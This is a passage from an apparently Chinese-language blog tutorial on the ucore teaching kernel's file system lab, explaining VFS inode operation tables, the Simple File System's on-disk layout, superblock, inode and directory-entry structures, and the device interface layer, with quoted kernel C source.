<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function table for device inodes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// The sfs specific DIR operations correspond to the abstract operations on a inode.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">sfs_node_dirops</span> = &#123;</span></span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = sfs_opendir,</span><br><span class="line">    .vop_close                      = sfs_close,</span><br><span class="line">    .vop_fstat                      = sfs_fstat,</span><br><span class="line">    .vop_fsync                      = sfs_fsync,</span><br><span class="line">    .vop_namefile                   = sfs_namefile,</span><br><span class="line">    .vop_getdirentry                = sfs_getdirentry,</span><br><span class="line">    .vop_reclaim                    = sfs_reclaim,</span><br><span class="line">    .vop_gettype                    = sfs_gettype,</span><br><span class="line">    .vop_lookup                     = sfs_lookup,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/// The sfs specific FILE operations correspond to the abstract operations on a inode.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">sfs_node_fileops</span> = &#123;</span></span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = sfs_openfile,</span><br><span class="line">    .vop_close                      = sfs_close,</span><br><span class="line">    .vop_read                       = sfs_read,</span><br><span class="line">    .vop_write                      = sfs_write,</span><br><span class="line">    .vop_fstat                      = sfs_fstat,</span><br><span class="line">    .vop_fsync                      = sfs_fsync,</span><br><span class="line">    .vop_reclaim                    = sfs_reclaim,</span><br><span class="line">    .vop_gettype                    = sfs_gettype,</span><br><span class="line">    .vop_tryseek                    = sfs_tryseek,</span><br><span class="line">    .vop_truncate                   = sfs_truncfile,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">dev_node_ops</span> = &#123;</span></span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = dev_open,</span><br><span class="line">    .vop_close                      = dev_close,</span><br><span class="line">    .vop_read                       = dev_read,</span><br><span class="line">    .vop_write                      = dev_write,</span><br><span class="line">    .vop_fstat                      = dev_fstat,</span><br><span class="line">    .vop_ioctl                      = dev_ioctl,</span><br><span class="line">    .vop_gettype                    = dev_gettype,</span><br><span class="line">    .vop_tryseek                    = dev_tryseek,</span><br><span class="line">    .vop_lookup                     = dev_lookup,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>inode</code>结构是与文件系统相关的，不同文件系统所实现的<code>inode</code>结构是不同的，它的存在可以让VFS忽略更下一级的文件系统差异，使之注重于提供一个统一的文件系统接口。<code>inode</code>根据其<code>in_info</code>的不同而实现其不同的功能。</p>
<blockquote>
<p>文件系统抽象层VFS提供了file接口、dir接口、inode接口、fs接口以及外设接口。而这些接口在<code>sfs</code>中被具体实现。</p>
</blockquote>
<h5 id="3-Simple-FS-文件系统层-SFS">3) Simple FS 文件系统层(SFS)</h5>
<h6 id="概述">概述</h6>
<p>从<code>VFS</code>向下一层，就是<code>SFS</code>。</p>
<p>ucore内核把所有文件都看作是字节流，任何内部逻辑结构都是专用的，由应用程序负责解释。但是ucore区分文件的物理结构。ucore目前支持如下几种类型的文件：</p>
<ul>
<li>常规文件：文件中包括的内容信息是由应用程序输入。SFS文件系统在普通文件上不强加任何内部结构，把其文件内容信息看作为字节。</li>
<li>目录：包含一系列的entry，每个entry包含文件名和指向与之相关联的索引节点（index node）的指针。目录是按层次结构组织的。</li>
<li>链接文件：实际上一个链接文件是一个已经存在的文件的另一个可选择的文件名。</li>
<li>设备文件：不包含数据，但是提供了一个映射物理设备（如串口、键盘等）到一个文件名的机制。可通过设备文件访问外围设备。</li>
<li>管道：管道是进程间通讯的一个基础设施。管道缓存了其输入端所接受的数据，以便在管道输出端读的进程能一个先进先出的方式来接受数据。</li>
</ul>
<p>SFS文件系统中目录和常规文件具有共同的属性，而这些属性保存在索引节点中。SFS通过索引节点来管理目录和常规文件，索引节点包含操作系统所需要的关于某个文件的关键信息，比如文件的属性、访问许可权以及其它控制信息都保存在索引节点中。可以有多个文件名可指向一个索引节点。</p>
<h6 id="函数接口与数据结构">函数接口与数据结构</h6>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sfs_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_mount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock_sfs_fs</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock_sfs_io</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock_sfs_fs</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock_sfs_io</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_rblock</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_wblock</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_rbuf</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_wbuf</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_sync_super</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_sync_freemap</span><span class="params">(struct sfs_fs *sfs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_clear_block</span><span class="params">(struct sfs_fs *sfs, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_load_inode</span><span class="params">(struct sfs_fs *sfs, struct inode **node_store, <span class="keyword">uint32_t</span> ino)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sfs_sync</span><span class="params">(struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> struct inode* <span class="title">sfs_get_root</span><span class="params">(struct fs *fs)</span> </span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sfs_unmount</span><span class="params">(struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sfs_cleanup</span><span class="params">(struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fs_init_read</span><span class="params">(struct device *dev, <span class="keyword">uint32_t</span> blkno, <span class="keyword">void</span> *blk_buffer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fs_do_mount</span><span class="params">(struct device *dev, struct fs **fs_store)</span></span>;</span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure>
<p>在<code>SFS</code>中涉及到了两种文件系统结构，分别是<code>fs</code>和<code>sfs_fs</code>。<code>fs</code>结构是我们在上层函数调用中所直接操作的抽象文件系统，而<code>sfs_fs</code>则是在下层函数中所使用的。在原先<code>sfs_fs</code>上抽象出一层<code>fs</code>结构有助于忽略不同文件系统的差异。其实现如下所示</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Abstract filesystem. (Or device accessible as a file.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Information:</span></span><br><span class="line"><span class="comment"> *      fs_info   : filesystem-specific data (sfs_fs)</span></span><br><span class="line"><span class="comment"> *      fs_type   : filesystem type</span></span><br><span class="line"><span class="comment"> * Operations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      fs_sync       - Flush all dirty buffers to disk.</span></span><br><span class="line"><span class="comment"> *      fs_get_root   - Return root inode of filesystem.</span></span><br><span class="line"><span class="comment"> *      fs_unmount    - Attempt unmount of filesystem.</span></span><br><span class="line"><span class="comment"> *      fs_cleanup    - Cleanup of filesystem.???</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * fs_get_root should increment the refcount of the inode returned.</span></span><br><span class="line"><span class="comment"> * It should not ever return NULL.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If fs_unmount returns an error, the filesystem stays mounted, and</span></span><br><span class="line"><span class="comment"> * consequently the struct fs instance should remain valid. On success,</span></span><br><span class="line"><span class="comment"> * however, the filesystem object and all storage associated with the</span></span><br><span class="line"><span class="comment"> * filesystem should have been discarded/released.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> __<span class="title">sfs_info</span>;</span></span><br><span class="line">    &#125; fs_info;                                     <span class="comment">// filesystem-specific data</span></span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">        fs_type_sfs_info,</span><br><span class="line">    &#125; fs_type;                                     <span class="comment">// filesystem type</span></span><br><span class="line">    <span class="keyword">int</span> (*fs_sync)(struct fs *fs);                 <span class="comment">// Flush all dirty buffers to disk</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *(*<span class="title">fs_get_root</span>)(<span class="title">struct</span> <span class="title">fs</span> *<span class="title">fs</span>);</span>   <span class="comment">// Return root inode of filesystem.</span></span><br><span class="line">    <span class="keyword">int</span> (*fs_unmount)(struct fs *fs);              <span class="comment">// Attempt unmount of filesystem.</span></span><br><span class="line">    <span class="keyword">void</span> (*fs_cleanup)(struct fs *fs);             <span class="comment">// Cleanup of filesystem.???</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* filesystem for sfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_super</span> <span class="title">super</span>;</span>                         <span class="comment">/* on-disk superblock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>                             <span class="comment">/* device mounted on */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bitmap</span> *<span class="title">freemap</span>;</span>                         <span class="comment">/* blocks in use are mared 0 */</span></span><br><span class="line">    <span class="keyword">bool</span> super_dirty;                               <span class="comment">/* true if super/freemap modified */</span></span><br><span class="line">    <span class="keyword">void</span> *sfs_buffer;                               <span class="comment">/* buffer for non-block aligned io */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> fs_sem;                             <span class="comment">/* semaphore for fs */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> io_sem;                             <span class="comment">/* semaphore for io */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex_sem;                          <span class="comment">/* semaphore for link/unlink and rename */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> inode_list;                        <span class="comment">/* inode linked-list */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *hash_list;                        <span class="comment">/* inode hash linked-list */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sfs_fs</code>结构中包含了底层设备的超级块<code>superblock</code>、所挂载的设备<code>dev</code>、以及底层设备中用于表示空间分配情况的<code>freemap</code>等。</p>
<h6 id="文件系统布局">文件系统布局</h6>
<p>文件系统通常保存在磁盘上。在本实验中，第三个磁盘（即disk0，前两个磁盘分别是 ucore.img 和 swap.img）用于存放一个SFS文件系统（Simple Filesystem）。通常文件系统中，磁盘的使用是以扇区（Sector）为单位的，但是为了实现简便，SFS 中以 block （4K，与内存 page 大小相等）为基本单位。</p>
<p>SFS文件系统的布局如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">+------------+----------+---------+-------------------------------------+</span><br><span class="line">| superblock | root-dir | freemap | Inode / File Data / Dir Data blocks |</span><br><span class="line">+------------+----------+---------+-------------------------------------+</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>第0个块（4K）是超级块（superblock），它包含了关于文件系统的所有关键参数，当计算机被启动或文件系统被首次接触时，超级块的内容就会被装入内存。其定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On-disk superblock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_super</span> &#123;</span></span><br><span class="line">    <span class="comment">// 超级块结构中包含成员变量魔数magic，内核通过它来检查磁盘镜像是否是合法的 SFS img</span></span><br><span class="line">    <span class="keyword">uint32_t</span> magic;                                 <span class="comment">/* magic number, should be SFS_MAGIC */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks;                                <span class="comment">/* # of blocks in fs */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> unused_blocks;                         <span class="comment">/* # of unused blocks in fs */</span></span><br><span class="line">    <span class="keyword">char</span> info[SFS_MAX_INFO_LEN + <span class="number">1</span>];                <span class="comment">/* infomation for sfs  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>第1个块放了一个root-dir的inode，用来记录根目录的相关信息。root-dir是SFS文件系统的根结点，通过这个root-dir的inode信息就可以定位并查找到根目录下的所有文件信息。</p>
</li>
<li>
<p>从第2个块开始，根据SFS中所有块的数量，用1个bit来表示一个块的占用和未被占用的情况。这个区域称为SFS的freemap区域，这将占用若干个块空间。为了更好地记录和管理freemap区域</p>
</li>
<li>
<p>最后在剩余的磁盘空间中，存放了所有其他目录和文件的inode信息和内容数据信息。需要注意的是虽然inode的大小小于一个块的大小（4096B），但为了实现简单，每个 inode 都占用一个完整的 block。</p>
</li>
</ul>
<h6 id="索引结点">索引结点</h6>
<ul>
<li>
<p>在<code>sfs</code>层面上，<code>inode</code>结构既可表示文件<code>file</code>、目录<code>dir</code>，也可表示设备<code>device</code>。而区分<code>inode</code>结构的操作有两种，一种是其<code>in_info</code>成员变量，另一种是该结构的成员指针<code>in_ops</code>。以下是函数<code>sfs_get_ops</code>的源码，该函数返回某个属性（文件/目录）所对应的<code>inode</code>操作：</p>
<blockquote>
<p>注意，设置inode_ops的操作不止一处，以下代码只作为示例。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sfs_get_ops - return function addr of fs_node_dirops/sfs_node_fileops</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> *</span></span><br><span class="line"><span class="class"><span class="title">sfs_get_ops</span>(<span class="title">uint16_t</span> <span class="title">type</span>) &#123;</span></span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">    <span class="keyword">case</span> SFS_TYPE_DIR:</span><br><span class="line">        <span class="keyword">return</span> &amp;sfs_node_dirops;</span><br><span class="line">    <span class="keyword">case</span> SFS_TYPE_FILE:</span><br><span class="line">        <span class="keyword">return</span> &amp;sfs_node_fileops;</span><br><span class="line">    &#125;</span><br><span class="line">    panic(<span class="string">"invalid file type %d.\n"</span>, type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当uCore创建一个<strong>用于存储文件/目录</strong>的<code>inode</code>结构（即该<code>inode</code>结构的<code>in_info</code>成员变量为<code>sfs_inode</code>类型）时，程序会执行函数<code>sfs_create_inode</code>。该函数会将<code>inode</code>结构中的<code>sfs_inode</code>成员与磁盘对应结点<code>sfs_disk_inode</code>相关联，从而使得只凭<code>inode</code>即可操作该结点。</p>
<blockquote>
<p>用于描述设备<code>device</code>的<code>inode</code>会在其他函数中被初始化，不会执行函数<code>sfs_create_inode</code></p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sfs_create_inode - alloc a inode in memroy, and init din/ino/dirty/reclian_count/sem fields in sfs_inode in inode</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_create_inode(struct sfs_fs *sfs, struct sfs_disk_inode *din, <span class="keyword">uint32_t</span> ino, struct inode **node_store) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((node = alloc_inode(sfs_inode)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        vop_init(node, sfs_get_ops(din-&gt;type), info2fs(sfs, sfs));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> *<span class="title">sin</span> = <span class="title">vop_info</span>(<span class="title">node</span>, <span class="title">sfs_inode</span>);</span></span><br><span class="line">        <span class="built_in">sin</span>-&gt;din = din, <span class="built_in">sin</span>-&gt;ino = ino, <span class="built_in">sin</span>-&gt;dirty = <span class="number">0</span>, <span class="built_in">sin</span>-&gt;reclaim_count = <span class="number">1</span>;</span><br><span class="line">        sem_init(&amp;(<span class="built_in">sin</span>-&gt;sem), <span class="number">1</span>);</span><br><span class="line">        *node_store = node;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>磁盘索引结点</strong>——保存在硬盘中的索引结点</p>
<p><code>sfs_disk_inode</code>结构记录了文件或目录的内容存储的索引信息，该数据结构在硬盘里储存，需要时读入内存。<code>type</code>成员表明该结构是目录类型还是文件类型，又或者是链接<code>link</code>类型。如果<code>inode</code>表示的是文件，则成员变量<code>direct[]</code>直接指向了保存文件内容数据的数据块索引值。<code>indirect</code>指向的是间接数据块，此数据块实际存放的全部是数据块索引，这些数据块索引指向的数据块才被用来存放文件内容数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* file types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SFS_TYPE_INVAL                              0       <span class="comment">/* Should not appear on disk */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SFS_TYPE_FILE                               1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SFS_TYPE_DIR                                2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SFS_TYPE_LINK                               3</span></span><br><span class="line"><span class="comment">/* inode (on disk) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> size;                                  <span class="comment">/* size of the file (in bytes) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> type;                                  <span class="comment">/* one of SYS_TYPE_* above */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> nlinks;                                <span class="comment">/* # of hard links to this file */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks;                                <span class="comment">/* # of blocks */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> direct[SFS_NDIRECT];                   <span class="comment">/* direct blocks */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> indirect;                              <span class="comment">/* indirect blocks */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>对于普通文件，索引值指向的 block 中保存的是文件中的数据。而对于目录，索引值指向的数据保存的是目录下所有的文件名以及对应的索引节点所在的索引块（磁盘块）所形成的数组。数据结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* file entry (on disk) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode number */</span></span><br><span class="line">    <span class="keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="number">1</span>];               <span class="comment">/* file name */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>内存索引结点</strong>——保存在内存中的索引结点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* inode for sfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span>;</span>                     <span class="comment">/* on-disk inode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode number */</span></span><br><span class="line">    <span class="keyword">bool</span> dirty;                                     <span class="comment">/* true if inode modified */</span></span><br><span class="line">    <span class="keyword">int</span> reclaim_count;                              <span class="comment">/* kill inode if it hits zero */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;                                <span class="comment">/* semaphore for din */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> inode_link;                        <span class="comment">/* entry for linked-list in sfs_fs */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;                         <span class="comment">/* entry for hash linked-list in sfs_fs */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>SFS中的内存<code>sfs_inode</code>除了包含SFS的硬盘<code>sfs_disk_inode</code>信息，而且还增加了其他一些信息。这些信息用于判断相关硬盘位置是否改写、互斥操作、回收和快速地定位等作用。</p>
<blockquote>
<p>需要注意的是，一个内存<code>sfs_inode</code>是在打开一个文件后才创建的，如果关机则相关信息都会消失。而硬盘<code>sfs_disk_inode</code>的内容是保存在硬盘中的，只是在进程需要时才被读入到内存中，用于访问文件或目录的具体内容数据</p>
</blockquote>
</li>
<li>
<p><strong>文件结点</strong>——用于<strong>指向磁盘索引结点</strong>的结点，其结构如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* file entry (on disk) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode number */</span></span><br><span class="line">    <span class="keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="number">1</span>];               <span class="comment">/* file name */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>文件结点中的<code>name</code>表示当前文件的文件名，而其<code>ino</code>成员则指向了<code>sfs_disk_inode</code>磁盘索引结点。上一层的目录索引结点则会指向各个下层的文件结点。</p>
<blockquote>
<p>将文件结点和磁盘索引结点分开，有助于<strong>硬链接</strong>的实现。</p>
</blockquote>
</li>
<li>
<p>同时，为了方便实现上面提到的多级数据的访问以及目录中 entry 的操作，对于<code>inode</code>，SFS实现了一些辅助的函数，它们分别是</p>
<blockquote>
<p>备注：这些函数的功能最好在阅读源码时详细了解。</p>
</blockquote>
<ul>
<li>
<p><code>sfs_bmap_load_nolock</code></p>
<blockquote>
<p>将对应<code>sfs_inode</code>的第 <code>index</code> 个索引指向的 block 的索引值取出，并存到相应的指针指向的单元（<code>ino_store</code>）。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>如果<code>index == din-&gt;blocks</code>, 则将会为<code>inode</code>增长一个 block。并标记 <code>inode</code> 为 dirty</p>
</blockquote>
<ul>
<li>
<p><code>sfs_bmap_truncate_nolock</code></p>
<blockquote>
<p>将多级数据索引表的最后一个 entry 释放掉。该函数可以认为是<code>sfs_bmap_load_nolock</code>中，<code>index == inode-&gt;blocks</code>的逆操作。</p>
</blockquote>
</li>
<li>
<p><code>sfs_dirent_read_nolock</code></p>
<blockquote>
<p>将目录的第 slot 个 entry 读取到指定的内存空间。</p>
</blockquote>
</li>
<li>
<p><code>sfs_dirent_search_nolock</code></p>
<blockquote>
<p>该函数是常用的查找函数，函数会在目录下查找 name，并且返回相应的搜索结果（文件或文件夹）的 inode 的编号（也是磁盘编号），和相应的 entry 在该目录的 index 编号以及目录下的数据页是否有空闲的 entry。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>需要注意的是，这些后缀为<code>nolock</code>的函数，只能在已经获得相应<code>inode</code>的<code>semaphore</code>才能调用。</p>
</blockquote>
</li>
</ul>
<h5 id="4-外设接口层-I-O设备">4) 外设接口层(I/O设备)</h5>
<ul>
<li>
<p>在底层一点就是I/O设备的相关实现，例如结构体<code>device</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dop_open(dev, open_flags)           ((dev)-&gt;d_open(dev, open_flags))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dop_close(dev)                      ((dev)-&gt;d_close(dev))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dop_io(dev, iob, write)             ((dev)-&gt;d_io(dev, iob, write))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dop_ioctl(dev, op, data)            ((dev)-&gt;d_ioctl(dev, op, data))</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> d_blocks;</span><br><span class="line">    <span class="keyword">size_t</span> d_blocksize;</span><br><span class="line">    <span class="keyword">int</span> (*d_open)(struct device *dev, <span class="keyword">uint32_t</span> open_flags);</span><br><span class="line">    <span class="keyword">int</span> (*d_close)(struct device *dev);</span><br><span class="line">    <span class="keyword">int</span> (*d_io)(struct device *dev, struct iobuf *iob, <span class="keyword">bool</span> write);</span><br><span class="line">    <span class="keyword">int</span> (*d_ioctl)(struct device *dev, <span class="keyword">int</span> op, <span class="keyword">void</span> *data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构体支持对块设备、字符设备的表示，完成对设备的基本操作。</p>
<p>不同底层设备所调用的函数方法是不同的，例如以下两个函数就是对不同设备<code>device</code>结构体的初始化</p>
<blockquote>
<p>需要注意的是，常用的<code>stdin</code>和<code>stdout</code>在uCore中是作为输入输出设备，与<code>disk0</code>处于同一个层次。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stdin_device_init(struct device *dev) &#123;</span><br><span class="line">    dev-&gt;d_blocks = <span class="number">0</span>;</span><br><span class="line">    dev-&gt;d_blocksize = <span class="number">1</span>;</span><br><span class="line">    dev-&gt;d_open = stdin_open;</span><br><span class="line">    dev-&gt;d_close = stdin_close;</span><br><span class="line">    dev-&gt;d_io = stdin_io;</span><br><span class="line">    dev-&gt;d_ioctl = stdin_ioctl;</span><br><span class="line"></span><br><span class="line">    p_rpos = p_wpos = <span class="number">0</span>;</span><br><span class="line">    wait_queue_init(wait_queue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">disk0_device_init(struct device *dev) &#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(DISK0_BLKSIZE % SECTSIZE == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!ide_device_valid(DISK0_DEV_NO)) &#123;</span><br><span class="line">        panic(<span class="string">"disk0 device isn't available.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dev-&gt;d_blocks = ide_device_size(DISK0_DEV_NO) / DISK0_BLK_NSECT;</span><br><span class="line">    dev-&gt;d_blocksize = DISK0_BLKSIZE;</span><br><span class="line">    dev-&gt;d_open = disk0_open;</span><br><span class="line">    dev-&gt;d_close = disk0_close;</span><br><span class="line">    dev-&gt;d_io = disk0_io;</span><br><span class="line">    dev-&gt;d_ioctl = disk0_ioctl;</span><br><span class="line">    sem_init(&amp;(disk0_sem), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static_assert</span>(DISK0_BUFSIZE % DISK0_BLKSIZE == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((disk0_buffer = kmalloc(DISK0_BUFSIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span 